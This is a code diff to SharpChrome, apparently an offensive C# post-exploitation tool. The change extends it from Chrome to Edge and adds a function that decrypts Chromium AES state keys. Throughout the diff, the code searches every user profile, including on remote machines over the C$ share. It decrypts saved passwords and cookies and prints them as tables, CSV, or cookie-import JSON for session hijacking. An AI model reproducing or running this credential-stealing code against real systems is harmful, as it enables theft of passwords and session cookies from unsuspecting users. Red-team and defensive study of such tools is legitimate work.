@@ -21,9 +21,15 @@ namespace SharpChrome
 
         // approach adapted from @djhohnstein's https://github.com/djhohnstein/SharpChrome/ project
         //  but using this CSHARP-SQLITE version https://github.com/akveo/digitsquare/tree/a251a1220ef6212d1bed8c720368435ee1bfdfc2/plugins/com.brodysoft.sqlitePlugin/src/wp
-        public static void TriageChromeLogins(Dictionary<string, string> MasterKeys, string computerName = "", string displayFormat = "table", bool showAll = false, bool unprotect = false)
+        public static void TriageChromeLogins(Dictionary<string, string> MasterKeys, string computerName = "", string displayFormat = "table", bool showAll = false, bool unprotect = false, string stateKey = "", string browser = "chrome")
         {
-            // triage all Chrome 'Login Data' files we can reach
+            // triage all Edge/Chrome 'Login Data' files we can reach
+
+            byte[] aesStateKey = null;
+            if (!String.IsNullOrEmpty(stateKey))
+            {
+                aesStateKey = SharpDPAPI.Helpers.ConvertHexStringToByteArray(stateKey);
+            }
 
             if (!String.IsNullOrEmpty(computerName))
             {
@@ -37,7 +43,7 @@ namespace SharpChrome
 
             if (SharpDPAPI.Helpers.IsHighIntegrity() || (!String.IsNullOrEmpty(computerName) && SharpDPAPI.Helpers.TestRemote(computerName)))
             {
-                Console.WriteLine("[*] Triaging Chrome Logins for ALL users\r\n");
+                Console.WriteLine("\r\n[*] Triaging {0} Logins for ALL users\r\n", SharpDPAPI.Helpers.Capitalize(browser));
 
                 string userFolder = "";
                 if (!String.IsNullOrEmpty(computerName))
@@ -55,46 +61,74 @@ namespace SharpChrome
                 {
                     if (!(dir.EndsWith("Public") || dir.EndsWith("Default") || dir.EndsWith("Default User") || dir.EndsWith("All Users")))
                     {
-                        string loginDataPath = String.Format("{0}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data", dir);
-                        var aesStateKeyPath = String.Format("{0}\\AppData\\Local\\Google\\Chrome\\User Data\\Local State", dir);
+                        var loginDataPath = "";
+                        var aesStateKeyPath = "";
 
-                        if (File.Exists(aesStateKeyPath))
+                        if (browser.ToLower() == "chrome")
+                        {
+                            loginDataPath = String.Format("{0}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data", dir);
+                            aesStateKeyPath = String.Format("{0}\\AppData\\Local\\Google\\Chrome\\User Data\\Local State", dir);
+                        }
+                        else if (browser.ToLower() == "edge")
+                        {
+                            loginDataPath = String.Format("{0}\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Login Data", dir);
+                            aesStateKeyPath = String.Format("{0}\\AppData\\Local\\Microsoft\\Edge\\User Data\\Local State", dir);
+                        }
+                        else
+                        {
+                            Console.WriteLine("[X] ERROR: only 'chrome' and 'edge' are currently supported for browsers.");
+                            return;
+                        }
+
+                        if (File.Exists(aesStateKeyPath) && (aesStateKey == null))
                         {
                             // try to decrypt the new v80+ AES state file key, if it exists
-                            byte[] aesStateKey = GetStateKey(MasterKeys, aesStateKeyPath, unprotect);
+                            aesStateKey = GetStateKey(MasterKeys, aesStateKeyPath, unprotect);
+                        }
 
-                            ParseChromeLogins(MasterKeys, loginDataPath, displayFormat, showAll, unprotect, aesStateKey);
-                        }
-                        else {
-                            ParseChromeLogins(MasterKeys, loginDataPath, displayFormat, showAll, unprotect, null);
-                        }
+                        ParseChromeLogins(MasterKeys, loginDataPath, displayFormat, showAll, unprotect, aesStateKey);
                     }
                 }
             }
             else
             {
-                // otherwise just triage the current user's credential folder
-                Console.WriteLine("[*] Triaging Chrome Logins for current user\r\n");
+                var loginDataPath = "";
+                var aesStateKeyPath = "";
 
-                string loginDataPath = String.Format("{0}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data", System.Environment.GetEnvironmentVariable("USERPROFILE"));
-                var aesStateKeyPath = String.Format("{0}\\AppData\\Local\\Google\\Chrome\\User Data\\Local State", System.Environment.GetEnvironmentVariable("USERPROFILE"));
-
-                if (File.Exists(aesStateKeyPath))
+                if (browser.ToLower() == "chrome")
                 {
-                    // try to decrypt the new v80+ AES state file key, if it exists
-                    byte[] aesStateKey = GetStateKey(MasterKeys, aesStateKeyPath, true); // force /unprotect
-                    ParseChromeLogins(MasterKeys, loginDataPath, displayFormat, showAll, true, aesStateKey);
+                    loginDataPath = String.Format("{0}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data", System.Environment.GetEnvironmentVariable("USERPROFILE"));
+                    aesStateKeyPath = String.Format("{0}\\AppData\\Local\\Google\\Chrome\\User Data\\Local State", System.Environment.GetEnvironmentVariable("USERPROFILE"));
+                }
+                else if (browser.ToLower() == "edge")
+                {
+                    loginDataPath = String.Format("{0}\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Login Data", System.Environment.GetEnvironmentVariable("USERPROFILE"));
+                    aesStateKeyPath = String.Format("{0}\\AppData\\Local\\Microsoft\\Edge\\User Data\\Local State", System.Environment.GetEnvironmentVariable("USERPROFILE"));
                 }
                 else
                 {
-                    ParseChromeLogins(MasterKeys, loginDataPath, displayFormat, showAll, true, null);
+                    Console.WriteLine("[X] ERROR: only 'chrome' and 'edge' are currently supported for browsers.");
+                    return;
                 }
+
+                if (File.Exists(aesStateKeyPath) && (aesStateKey == null))
+                {
+                    // try to decrypt the new v80+ AES state file key, if it exists
+                    aesStateKey = GetStateKey(MasterKeys, aesStateKeyPath, true);
+                }
+
+                ParseChromeLogins(MasterKeys, loginDataPath, displayFormat, showAll, true, aesStateKey);
             }
         }
 
-        public static void TriageChromeCookies(Dictionary<string, string> MasterKeys, string computerName = "", string displayFormat = "csv", bool showAll = false, bool unprotect = false, string cookieRegex = "", string urlRegex = "", bool setneverexpire = false)
+        public static void TriageChromeCookies(Dictionary<string, string> MasterKeys, string computerName = "", string displayFormat = "csv", bool showAll = false, bool unprotect = false, string cookieRegex = "", string urlRegex = "", bool setneverexpire = false, string stateKey = "", string browser = "chrome")
         {
-            // triage all Chrome Cookies we can reach
+            // triage all Edge/Chrome Cookies we can reach
+
+            byte[] aesStateKey = null;
+            if(!String.IsNullOrEmpty(stateKey)) {
+                aesStateKey = SharpDPAPI.Helpers.ConvertHexStringToByteArray(stateKey);
+            }
 
             if (!String.IsNullOrEmpty(computerName))
             {
@@ -108,7 +142,7 @@ namespace SharpChrome
 
             if (SharpDPAPI.Helpers.IsHighIntegrity() || (!String.IsNullOrEmpty(computerName) && SharpDPAPI.Helpers.TestRemote(computerName)))
             {
-                Console.WriteLine("[*] Triaging Chrome Cookies for ALL users\r\n");
+                Console.WriteLine("\r\n[*] Triaging {0} Cookies for ALL users\r\n", SharpDPAPI.Helpers.Capitalize(browser));
 
                 string userFolder = "";
                 if (!String.IsNullOrEmpty(computerName))
@@ -126,40 +160,151 @@ namespace SharpChrome
                 {
                     if (!(dir.EndsWith("Public") || dir.EndsWith("Default") || dir.EndsWith("Default User") || dir.EndsWith("All Users")))
                     {
-                        string cookiePath = String.Format("{0}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies", dir);
-                        var aesStateKeyPath = String.Format("{0}\\AppData\\Local\\Google\\Chrome\\User Data\\Local State", dir);
+                        var cookiePath = "";
+                        var aesStateKeyPath = "";
 
-                        if (File.Exists(aesStateKeyPath))
+                        if (browser.ToLower() == "chrome")
                         {
-                            // try to decrypt the new v80+ AES state file key, if it exists
-                            byte[] aesStateKey = GetStateKey(MasterKeys, aesStateKeyPath, unprotect);
-
-                            ParseChromeCookies(MasterKeys, cookiePath, displayFormat, showAll, unprotect, cookieRegex, urlRegex, setneverexpire, aesStateKey);
+                            cookiePath = String.Format("{0}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies", dir);
+                            aesStateKeyPath = String.Format("{0}\\AppData\\Local\\Google\\Chrome\\User Data\\Local State", dir);
+                        }
+                        else if (browser.ToLower() == "edge")
+                        {
+                            cookiePath = String.Format("{0}\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Cookies", dir);
+                            aesStateKeyPath = String.Format("{0}\\AppData\\Local\\Microsoft\\Edge\\User Data\\Local State", dir);
                         }
                         else
                         {
-                            ParseChromeCookies(MasterKeys, cookiePath, displayFormat, showAll, unprotect, cookieRegex, urlRegex, setneverexpire, null);
+                            Console.WriteLine("[X] ERROR: only 'chrome' and 'edge' are currently supported for browsers.");
+                            return;
                         }
+
+                        if (File.Exists(aesStateKeyPath) && (aesStateKey == null))
+                        {
+                            // try to decrypt the new v80+ AES state file key, if it exists
+                            aesStateKey = GetStateKey(MasterKeys, aesStateKeyPath, unprotect);   
+                        }
+
+                        ParseChromeCookies(MasterKeys, cookiePath, displayFormat, showAll, unprotect, cookieRegex, urlRegex, setneverexpire, aesStateKey);
                     }
                 }
             }
             else
             {
                 // otherwise just triage the current user's credential folder, so use CryptUnprotectData() by default
-                Console.WriteLine("[*] Triaging Chrome Cookies for current user.\r\n");
 
-                string cookiePath = String.Format("{0}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies", System.Environment.GetEnvironmentVariable("USERPROFILE"));
-                var aesStateKeyPath = String.Format("{0}\\AppData\\Local\\Google\\Chrome\\User Data\\Local State", System.Environment.GetEnvironmentVariable("USERPROFILE"));
+                var cookiePath = "";
+                var aesStateKeyPath = "";
 
-                if (File.Exists(aesStateKeyPath))
+                if (browser.ToLower() == "chrome")
                 {
-                    // try to decrypt the new v80+ AES state file key, if it exists
-                    byte[] aesStateKey = GetStateKey(MasterKeys, aesStateKeyPath, true); // force /unprotect
-                    ParseChromeCookies(MasterKeys, cookiePath, displayFormat, showAll, true, cookieRegex, urlRegex, setneverexpire, aesStateKey);
+                    cookiePath = String.Format("{0}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies", System.Environment.GetEnvironmentVariable("USERPROFILE"));
+                    aesStateKeyPath = String.Format("{0}\\AppData\\Local\\Google\\Chrome\\User Data\\Local State", System.Environment.GetEnvironmentVariable("USERPROFILE"));
+                }
+                else if (browser.ToLower() == "edge")
+                {
+                    cookiePath = String.Format("{0}\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Cookies", System.Environment.GetEnvironmentVariable("USERPROFILE"));
+                    aesStateKeyPath = String.Format("{0}\\AppData\\Local\\Microsoft\\Edge\\User Data\\Local State", System.Environment.GetEnvironmentVariable("USERPROFILE"));
                 }
                 else
                 {
-                    ParseChromeCookies(MasterKeys, cookiePath, displayFormat, showAll, true, cookieRegex, urlRegex, setneverexpire, null);
+                    Console.WriteLine("[X] ERROR: only 'chrome' and 'edge' are currently supported for browsers.");
+                    return;
+                }
+
+                if (File.Exists(aesStateKeyPath) && (aesStateKey == null))
+                {
+                    // try to decrypt the new v80+ AES state file key, if it exists
+                    aesStateKey = GetStateKey(MasterKeys, aesStateKeyPath, true); // force /unprotect
+                }
+
+                ParseChromeCookies(MasterKeys, cookiePath, displayFormat, showAll, true, cookieRegex, urlRegex, setneverexpire, aesStateKey);
+            }
+        }
+
+        public static void TriageStateKeys(Dictionary<string, string> MasterKeys, string computerName = "", bool unprotect = false, string target = "")
+        {
+            // triage all Chromium state keys we can reach
+
+            if (!String.IsNullOrEmpty(computerName))
+            {
+                // if we're triaging a remote computer, check connectivity first
+                bool canAccess = SharpDPAPI.Helpers.TestRemote(computerName);
+                if (!canAccess)
+                {
+                    return;
+                }
+            }
+
+            if (!String.IsNullOrEmpty(target))
+            {
+                if (File.Exists(target))
+                {
+                    byte[] aesStateKey = GetStateKey(MasterKeys, target, unprotect);
+                }
+                else
+                {
+                    Console.WriteLine("[X] Target '{0}' doesn't exist.", target);
+                }
+            }
+            else
+            {
+                if (SharpDPAPI.Helpers.IsHighIntegrity() || (!String.IsNullOrEmpty(computerName) && SharpDPAPI.Helpers.TestRemote(computerName)))
+                {
+                    Console.WriteLine("[*] Triaging Chromium state keys for ALL users\r\n");
+
+                    string userFolder = "";
+                    if (!String.IsNullOrEmpty(computerName))
+                    {
+                        userFolder = String.Format("\\\\{0}\\C$\\Users\\", computerName);
+                    }
+                    else
+                    {
+                        userFolder = String.Format("{0}\\Users\\", Environment.GetEnvironmentVariable("SystemDrive"));
+                    }
+
+                    string[] dirs = Directory.GetDirectories(userFolder);
+
+                    foreach (string dir in dirs)
+                    {
+                        if (!(dir.EndsWith("Public") || dir.EndsWith("Default") || dir.EndsWith("Default User") || dir.EndsWith("All Users")))
+                        {
+                            var chromeAESStateKeyPath = String.Format("{0}\\AppData\\Local\\Google\\Chrome\\User Data\\Local State", dir);
+                            var edgeAESStateKeyPath = String.Format("{0}\\AppData\\Local\\Microsoft\\Edge\\User Data\\Local State", dir);
+
+                            if (File.Exists(chromeAESStateKeyPath))
+                            {
+                                // try to decrypt the new v80+ AES state file key, if it exists
+                                byte[] aesStateKey = GetStateKey(MasterKeys, chromeAESStateKeyPath, unprotect);
+                            }
+
+                            if (File.Exists(edgeAESStateKeyPath))
+                            {
+                                // try to decrypt the new v80+ AES state file key, if it exists
+                                byte[] aesStateKey = GetStateKey(MasterKeys, edgeAESStateKeyPath, unprotect);
+                            }
+                        }
+                    }
+                }
+                else
+                {
+                    // otherwise just triage the current user's credential folder, so use CryptUnprotectData() by default
+                    Console.WriteLine("[*] Triaging Chromium state keys for current user.\r\n");
+
+                    var chromeAESStateKeyPath = String.Format("{0}\\AppData\\Local\\Google\\Chrome\\User Data\\Local State", System.Environment.GetEnvironmentVariable("USERPROFILE"));
+                    var edgeAESStateKeyPath = String.Format("{0}\\AppData\\Local\\Microsoft\\Edge\\User Data\\Local State", System.Environment.GetEnvironmentVariable("USERPROFILE"));
+
+                    if (File.Exists(chromeAESStateKeyPath))
+                    {
+                        // try to decrypt the new v80+ AES state file key, if it exists
+                        byte[] aesStateKey = GetStateKey(MasterKeys, chromeAESStateKeyPath, true); // force /unprotect
+                    }
+
+                    if (File.Exists(edgeAESStateKeyPath))
+                    {
+                        // try to decrypt the new v80+ AES state file key, if it exists
+                        byte[] aesStateKey = GetStateKey(MasterKeys, edgeAESStateKeyPath, true); // force /unprotect
+                    }
                 }
             }
         }
@@ -247,7 +392,7 @@ namespace SharpChrome
                     {
                         if (!someResults)
                         {
-                            Console.WriteLine("\r\n--- Chrome Credential (Path: {0}) ---\r\n", loginDataFilePath);
+                            Console.WriteLine("\r\n--- Credential (Path: {0}) ---\r\n", loginDataFilePath);
                         }
                         someResults = true;
                         Console.WriteLine("URL       : {0} ({1})", row.column[0].Value, row.column[1].Value);
@@ -261,7 +406,7 @@ namespace SharpChrome
                     {
                         if (!someResults)
                         {
-                            Console.WriteLine("\r\n--- Chrome Credential (Path: {0}) ---\r\n", loginDataFilePath);
+                            Console.WriteLine("\r\n---  Credential (Path: {0}) ---\r\n", loginDataFilePath);
                             Console.WriteLine("file_path,signon_realm,origin_url,date_created,times_used,username,password");
                         }
                         someResults = true;
@@ -375,7 +520,8 @@ namespace SharpChrome
 
                     // check conditions that will determine whether we're displaying this cookie entry
                     bool displayValue = false;
-                    if (showAll)
+
+                    if (showAll || (row.column[4].Value.ToString() == "0") || String.IsNullOrEmpty(row.column[4].Value.ToString()))
                     {
                         displayValue = true;
                     }
@@ -406,7 +552,7 @@ namespace SharpChrome
                         {
                             if (!someResults)
                             {
-                                Console.WriteLine("--- Chrome Cookies (Path: {0}) ---\r\n", cookieFilePath);
+                                Console.WriteLine("--- Cookies (Path: {0}) ---\r\n", cookieFilePath);
                             }
                             someResults = true;
 
@@ -419,8 +565,8 @@ namespace SharpChrome
                         {
                             if (!someResults)
                             {
-                                Console.WriteLine("--- Chrome Cookies (Path: {0}) ---\r\n", cookieFilePath);
-                                Console.WriteLine("--- Chrome Cookies (Path: {0}) ---\r\n\r\nEditThisCookie import JSON:\r\n\r\n[\r\n{{\r\n", cookieFilePath);
+                                Console.WriteLine("--- Cookies (Path: {0}) ---\r\n", cookieFilePath);
+                                Console.WriteLine("--- Cookies (Path: {0}) ---\r\n\r\nEditThisCookie import JSON:\r\n\r\n[\r\n{{\r\n", cookieFilePath);
                             }
                             else
                             {
@@ -454,7 +600,7 @@ namespace SharpChrome
                             // csv output
                             if (!someResults)
                             {
-                                Console.WriteLine("--- Chrome Cookies (Path: {0}) ---\r\n", cookieFilePath);
+                                Console.WriteLine("--- Cookies (Path: {0}) ---\r\n", cookieFilePath);
                                 Console.WriteLine("file_path,host,path,name,value,creation_utc,expires_utc,last_access_utc");
                             }
                             someResults = true;
@@ -471,7 +617,7 @@ namespace SharpChrome
                         }
                     }
                 }
-                catch { }
+                catch {}
             }
 
             if (displayFormat.Equals("json") && someResults)
